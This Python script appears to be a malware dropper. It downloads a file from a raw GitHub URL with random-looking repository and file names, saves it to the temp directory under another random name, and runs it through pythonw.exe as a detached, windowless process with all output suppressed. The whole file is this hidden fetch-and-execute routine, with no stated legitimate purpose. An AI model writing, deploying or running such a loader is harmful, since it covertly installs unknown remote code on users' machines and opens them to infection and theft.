import os
import sys
import urllib.request
import tempfile
import subprocess
import shutil

RAW_URL = "https://raw.githubusercontent.com/Prenda00/canlmiop/refs/heads/main/dikdui.py"

def download_to_temp(url, filename="jshfuwe.py"):
    td = tempfile.gettempdir()
    dest = os.path.join(td, filename)
    with urllib.request.urlopen(url) as r:
        data = r.read()
    with open(dest, "wb") as f:
        f.write(data)
    return dest

def find_pythonw():
    exe = sys.executable
    candidate = exe.replace("python.exe", "pythonw.exe")
    if os.path.isfile(candidate):
        return candidate
    which = shutil.which("pythonw.exe")
    if which:
        return which
    return exe

def launch_detached(pythonw_path, script_path):
    creationflags = 0
    try:
        creationflags |= subprocess.CREATE_NEW_PROCESS_GROUP
    except AttributeError:
        pass
    if hasattr(subprocess, "DETACHED_PROCESS"):
        creationflags |= subprocess.DETACHED_PROCESS

    subprocess.Popen(
        [pythonw_path, script_path],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        close_fds=True,
        creationflags=creationflags
    )

def main():
    script_local = download_to_temp(RAW_URL)
    pyw = find_pythonw()
    launch_detached(pyw, script_local)

if __name__ == "__main__":
    main()
